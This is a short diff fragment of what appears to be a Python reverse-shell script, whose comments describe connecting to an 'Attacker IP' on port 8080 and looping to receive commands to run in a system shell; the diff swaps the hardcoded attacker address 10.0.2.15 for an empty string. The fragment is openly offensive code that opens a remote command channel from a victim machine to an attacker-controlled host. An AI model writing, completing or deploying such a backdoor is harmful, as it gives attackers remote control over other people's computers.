@@ -3,7 +3,7 @@ import subprocess # To start the shell in the system
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' 
-    s.connect(('10.0.2.15', 8080)) # Here we define the Attacker IP and the listening port
+    s.connect(('', 8080)) # Here we define the Attacker IP and the listening port
 
     while True: # keep receiving commands from the machine
         command = s.recv(1024) # read the first KB of the tcp socket
